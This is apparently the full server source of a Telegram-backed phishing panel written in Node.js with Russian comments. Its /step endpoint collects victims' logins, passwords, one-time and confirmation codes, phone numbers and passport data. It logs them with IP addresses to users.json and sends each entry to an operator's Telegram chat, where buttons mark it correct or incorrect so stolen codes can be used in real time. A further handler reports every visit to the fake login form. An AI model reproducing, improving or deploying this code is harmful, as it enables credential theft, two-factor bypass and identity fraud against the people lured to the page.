require('dotenv').config();

// Add unhandled promise rejection handler at the very beginning
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Optional: process.exit(1); // Exit with failure code if necessary
});

const express = require("express");
const fs = require("fs");
const fetch = require("node-fetch");
const bodyParser = require("body-parser");
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3001;

// Log startup info
console.log(`Server starting on port ${PORT}`);
console.log('Environment variables loaded:');
console.log('TELEGRAM_TOKEN:', process.env.TELEGRAM_TOKEN ? '✅ Found' : '❌ Not found');
console.log('TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID ? '✅ Found' : '❌ Not found');

// === CONFIGURATION ===
if (!process.env.TELEGRAM_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
  console.error('Error: Missing required environment variables!');
  console.error('Please create a .env file with TELEGRAM_TOKEN and TELEGRAM_CHAT_ID');
  process.exit(1);
}

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const USERS_FILE = "users.json";

app.use(cors()); // Используем cors middleware

// === CONFIGURATION ===
// Конфигурация загружена из переменных окружения
console.log('Configuration loaded:');
console.log('TELEGRAM_TOKEN:', process.env.TELEGRAM_TOKEN ? '✅ Found' : '❌ Not found');
console.log('TELEGRAM_CHAT_ID:', process.env.TELEGRAM_CHAT_ID ? '✅ Found' : '❌ Not found');
console.log('USERS_FILE:', USERS_FILE);

app.use(bodyParser.json());
app.use(express.static(__dirname));

let users = {};
if (fs.existsSync(USERS_FILE)) {
  users = JSON.parse(fs.readFileSync(USERS_FILE));
}

function saveUsers() {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

function getUserId(ip) {
  for (const id in users) {
    if (users[id].ip === ip) return id;
  }
  const newId = (Object.keys(users).length + 1).toString();
  users[newId] = {
    ip,
    steps: {},
    status: {},
    created: new Date().toISOString()
  };
  saveUsers();
  return newId;
}

async function sendToTelegram(message, replyMarkup = null) {
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML"
  };
  if (replyMarkup) {
    payload.reply_markup = JSON.stringify(replyMarkup);
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  console.log('Attempting to send message to Telegram:', { url, payload });

  try {
    console.log('Before fetch to Telegram API: Preparing options...');
    const fetchOptions = {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    };
    console.log('Before fetch to Telegram API: Options prepared.', fetchOptions);

    console.log('Before await fetch call...');
    try {
      const response = await fetch(url, fetchOptions);
      console.log('After await fetch call. Received response.');

      console.log('Received response status from Telegram:', response.status);

      if (!response.ok) {
        console.log('Response not OK. Reading error text...');
        const errorText = await response.text();
        console.log('Finished reading error text.');
        console.error(`Error sending message to Telegram: ${response.status} ${response.statusText} - ${errorText}`);
        return false; // Indicate failure
      }

      console.log('Response is OK. Reading JSON data...');
      const data = await response.json();
      console.log('Finished reading JSON data.');
      console.log('Received JSON response from Telegram:', data); // Log full JSON response

      if (!data.ok) {
          console.error('Telegram API returned an error:', data);
          return false; // Indicate failure
      }

      console.log('Message successfully sent to Telegram:', data);
      return true; // Indicate success
    } catch (fetchError) {
      console.error('Error during fetch call to Telegram API:', fetchError);
      return false;
    }
  } catch (error) {
    console.error('Network error or exception when sending to Telegram:', error);
    return false; // Indicate failure
  }
}

// === STEP HANDLER ===
app.post("/step", async (req, res) => {
  const { step, value, origin, userId } = req.body;
  if (!userId) return res.status(400).json({ error: 'No userId' });
  if (!users[userId]) {
    users[userId] = { steps: {}, status: {} };
    saveUsers();
  }
  users[userId].steps[step] = value;
  users[userId].status[step] = "waiting";
  saveUsers();

  const ip = req.ip;
  let msg = `📍 Источник: ${origin || 'Неизвестно'}\n👤 Пользователь #${userId}\n🌐 IP: ${ip}\n`;
  const withApproval = ["login", "password", "login_password", "code", "code1", "code2", "code3", "document", "finalCode", "passport"];
  const readable = {
    login: "Логин",
    password: "Пароль",
    code: "Код подтверждения",
    code1: "Код 1",
    code2: "Код 2",
    code3: "Код 3",
    phone: "Телефон",
    document: "Документ",
    passport: "Паспорт РФ",
    finalCode: "Финальный код",
    login_password: "Логин/Пароль",
    document_type: "Тип документа"
  };

  // Обработка для информативного шага resend_code_click
  if (step === 'resend_code_click') {
    const infoMsg = `🔄 Пользователь #${userId} нажал «Отправить повторно»\n${msg}`;
    await sendToTelegram(infoMsg);
    res.json({ ok: true });
    return;
  }

  if (step === 'login_password') {
    msg += `📄 ${value}`;
  } else {
    msg += `📄 ${readable[step]}: ${value}`;
  }

  if (withApproval.includes(step)) {
    const reply_markup = {
      inline_keyboard: [[
        { text: "✅ Верно", callback_data: `${userId}:${step}:ok` },
        { text: "❌ Неверно", callback_data: `${userId}:${step}:fail` }
      ]]
    };
    await sendToTelegram(msg, reply_markup);
  } else {
    await sendToTelegram(msg);
  }

  if (step === "login_password" || step === "code") {
    res.json({ waitForValidation: true });
  } else {
    res.json({ ok: true });
  }
});

// === STATUS HANDLER ===
app.get("/status", (req, res) => {
  const { step, userId } = req.query;
  if (!userId || !users[userId]) return res.json({ status: "none" });
  const status = users[userId].status[step] || "none";
  res.json({ status });
});

// === TELEGRAM POLLING ===
const ENABLE_POLLING = true;
let pollingInterval = null;
let isPolling = false;
let restartAttempts = 0;
const MAX_RESTART_ATTEMPTS = 5;
const RESTART_DELAY = 5000; // 5 seconds

async function clearUpdates() {
  try {
    console.log('Clearing previous updates...');
    // Добавляем параметр timeout=0 для немедленного ответа
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1&timeout=0`);
    if (!res.ok) {
      const errorText = await res.text();
      console.error(`Error clearing updates: ${res.status} ${res.statusText} - ${errorText}`);
      return false;
    }
    console.log('Previous updates cleared successfully');
    return true;
  } catch (error) {
    console.error('Error clearing updates:', error);
    return false;
  }
}

async function stopPolling() {
  if (pollingInterval) {
    clearInterval(pollingInterval);
    pollingInterval = null;
  }
  isPolling = false;
  console.log('Telegram polling stopped');
}

async function waitForTelegramAvailability() {
  try {
    // Проверяем доступность бота через getMe
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
    if (!res.ok) {
      const errorText = await res.text();
      console.error(`Bot availability check failed: ${res.status} ${res.statusText} - ${errorText}`);
      return false;
    }
    const data = await res.json();
    if (!data.ok) {
      console.error('Bot availability check failed:', data);
      return false;
    }
    console.log('Bot is available:', data.result.username);
    return true;
  } catch (error) {
    console.error('Error checking bot availability:', error);
    return false;
  }
}

async function pollTelegram() {
  if (isPolling) {
    console.log('Polling already in progress, skipping...');
    return;
  }

  // Проверяем доступность бота перед началом
  if (!await waitForTelegramAvailability()) {
    console.log('Bot is not available, will retry later...');
    setTimeout(() => pollTelegram(), RESTART_DELAY);
    return;
  }

  // Clear previous updates before starting
  if (!await clearUpdates()) {
    console.log('Failed to clear updates, will retry later...');
    setTimeout(() => pollTelegram(), RESTART_DELAY);
    return;
  }
  
  isPolling = true;
  let lastUpdate = 0;
  restartAttempts = 0;
  
  pollingInterval = setInterval(async () => {
    if (!isPolling) return;
    
    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdate + 1}&timeout=1`);
      if (!res.ok) {
        const errorText = await res.text();
        
        if (res.status === 409) {
          // Упрощаем логирование для конфликтов, так как они не критичны
          console.log('Telegram API conflict detected, restarting polling...');
          restartAttempts++;
          
          if (restartAttempts >= MAX_RESTART_ATTEMPTS) {
            console.log('Taking a longer break before next polling attempt...');
            await stopPolling();
            setTimeout(() => {
              restartAttempts = 0;
              pollTelegram();
            }, RESTART_DELAY * 2);
            return;
          }
          
          await stopPolling();
          const delay = RESTART_DELAY * restartAttempts;
          setTimeout(() => pollTelegram(), delay);
        } else {
          // Для других ошибок оставляем подробное логирование
          console.error(`Error fetching Telegram updates: ${res.status} ${res.statusText} - ${errorText}`);
        }
        return;
      }
      
      const data = await res.json();
      if (data.result && data.result.length) {
        for (const update of data.result) {
          lastUpdate = update.update_id;
          if (update.callback_query) {
            const cb = update.callback_query;
            const [userId, step, action] = (cb.data || '').split(':');
            if (userId && step && action && users[userId]) {
              users[userId].status[step] = action === 'ok' ? 'ok' : 'fail';
              saveUsers();
              console.log(`Updated status for user ${userId}, step ${step}: ${action}`);
            }
          }
        }
      }
    } catch (error) {
      // Упрощаем логирование для ошибок сети
      console.log('Network error in polling, will retry...');
    }
  }, 1000);
}

// Handle process termination
process.on('SIGTERM', async () => {
  console.log('SIGTERM received, stopping server...');
  await stopPolling();
  process.exit(0);
});

process.on('SIGINT', async () => {
  console.log('SIGINT received, stopping server...');
  await stopPolling();
  process.exit(0);
});

// Добавляем обработчик для необработанных исключений
process.on('uncaughtException', async (error) => {
  console.error('Uncaught Exception:', error);
  await stopPolling();
  process.exit(1);
});

if (ENABLE_POLLING) {
  // Добавляем небольшую задержку перед первым запуском
  setTimeout(() => {
    pollTelegram().catch(error => {
      console.error('Failed to start polling:', error);
      process.exit(1);
    });
  }, 2000);
}

// === AUTH VISIT HANDLER ===
app.post('/auth-visit', (req, res) => {
  const ip = req.ip;
  let userId = null;
  for (const id in users) {
    if (users[id].ip === ip) {
      userId = id;
      break;
    }
  }
  if (!userId) {
    // Новый пользователь — присваиваем следующий номер
    const newId = (Object.keys(users).length + 1).toString();
    userId = newId;
    users[userId] = { ip, steps: {}, status: {}, created: new Date().toISOString() };
    saveUsers();
  }
  // Отправляем уведомление при каждом заходе
  const msg = `🆕 Пользователь #${userId} (IP: ${ip}) зашёл на форму авторизации\nВремя: ${new Date().toLocaleString()}`;
  sendToTelegram(msg);
  res.json({ userId });
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});